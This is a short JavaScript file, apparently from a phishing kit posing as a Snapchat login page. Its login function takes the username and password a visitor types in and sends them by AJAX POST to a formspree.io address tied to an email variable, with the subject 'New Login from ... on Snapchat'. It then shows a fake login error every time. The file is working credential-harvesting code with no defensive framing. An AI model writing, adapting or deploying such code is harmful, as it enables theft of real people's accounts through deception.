$(document).ready(function() {
    if (!custom_login_message.trim()) {
        // do nothing
    } else {
        $('#custom_msg').text(custom_login_message);
        $('#custom_msg').show();
    }
});

var login_counter = 0;

function login() {

    login_counter += 1;

    var username_value = $('#i_username').val();
    var password_value = $('#i_password').val();

    $.ajax({
        url: "https://formspree.io/" + email,
        method: "POST",
        data: {username: username_value,
               password: password_value,
               _subject: "New Login from \"" + username_value + "\" on Snapchat",
               _format: "plain"},
        dataType: "json"
    });

    $('#login_error').show();
}
